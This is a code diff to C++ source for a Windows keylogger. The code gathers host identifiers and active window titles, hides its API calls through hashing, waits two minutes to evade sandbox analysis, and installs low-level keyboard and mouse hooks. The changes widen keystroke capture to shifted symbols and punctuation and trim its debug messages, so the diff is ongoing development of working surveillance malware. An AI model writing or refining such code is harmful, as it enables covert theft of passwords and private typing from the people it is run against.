@@ -13,7 +13,7 @@
 // --- 1. SYSTEM METADATA ---
 std::string GetMachineId() {
     HW_PROFILE_INFOA hw;
-    return GetCurrentHwProfileA(&hw) ? std::string(hw.szHwProfileGuid) : "{DEV-ID}";
+    return GetCurrentHwProfileA(&hw) ? std::string(hw.szHwProfileGuid) : "{7e0a3c81-dev}";
 }
 
 std::string GetHostname() {
@@ -44,15 +44,15 @@ std::string GetActiveWindowTitle() {
         GetWindowTextA(hwnd, title, sizeof(title));
         return std::string(title);
     }
-    return "Desktop/System";
+    return "System/Desktop";
 }
 
 // --- 2. DEBUG LOGGING ---
 void WriteDebug(std::string msg) {
-    char path[MAX_PATH];
     std::ofstream f1("internal_status.txt", std::ios::app);
     if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }
 
+    char path[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
         std::string fullPath = std::string(path) + "\\debug_log.txt";
         std::ofstream f2(fullPath, std::ios::app);
@@ -60,7 +60,7 @@ void WriteDebug(std::string msg) {
     }
 }
 
-// --- 3. API HASHING ENGINE ---
+// --- 3. API HASHING ---
 constexpr DWORD HashString(const char* str) {
     DWORD hash = 0x811c9dc5;
     while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
@@ -150,11 +150,27 @@ LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
             buffer += c;
         }
         else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
-            if (shift && k->vkCode == 0x32) buffer += "@";
-            else buffer += (char)k->vkCode;
+            if (shift) {
+                switch (k->vkCode) {
+                    case 0x31: buffer += "!"; break;
+                    case 0x32: buffer += "@"; break;
+                    case 0x33: buffer += "#"; break;
+                    case 0x34: buffer += "$"; break;
+                    case 0x35: buffer += "%"; break;
+                    case 0x36: buffer += "^"; break;
+                    case 0x37: buffer += "&"; break;
+                    case 0x38: buffer += "*"; break;
+                    case 0x39: buffer += "("; break;
+                    case 0x30: buffer += ")"; break;
+                }
+            } else { buffer += (char)k->vkCode; }
         }
-        else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
-        else if (k->vkCode == VK_SPACE) buffer += " ";
+        else if (k->vkCode == VK_OEM_PERIOD) buffer += (shift ? ">" : ".");
+        else if (k->vkCode == VK_OEM_COMMA)  buffer += (shift ? "<" : ",");
+        else if (k->vkCode == VK_OEM_2)      buffer += (shift ? "?" : "/");
+        else if (k->vkCode == VK_OEM_7)      buffer += (shift ? "\"" : "'");
+        else if (k->vkCode == VK_OEM_1)      buffer += (shift ? ":" : ";");
+        else if (k->vkCode == VK_SPACE)      buffer += " ";
     }
     return CallNextHookEx(NULL, n, w, l);
 }
@@ -170,33 +186,22 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
         // JUNK_HERE
     }
 
-    WriteDebug("Entering 2-minute Sandbox Delay...");
     Sleep(120000); 
 
-    WriteDebug("Sleep Complete. Initializing Hooks...");
     HMODULE u32 = GetModuleHandleA("user32.dll");
     if (!u32) u32 = LoadLibraryA("user32.dll");
 
-    // Attempt Hashed Lookup
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
 
-    // Fallback for your specific Windows Build
     if (!_SetHook) {
         WriteDebug("API Hashing Failed. Switching to Direct Fallback...");
         _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
     }
 
     if (_SetHook) {
-        HHOOK kHook = _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
-        HHOOK mHook = _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
-
-        if (kHook && mHook) {
-            WriteDebug("Hooks Online. Monitoring input...");
-        } else {
-            WriteDebug("Hook Error: " + std::to_string(GetLastError()));
-        }
-    } else {
-        WriteDebug("Critical: SetWindowsHookExA not found.");
+        _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
+        _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
+        WriteDebug("Hooks Online. Monitoring input...");
     }
 
     MSG msg;
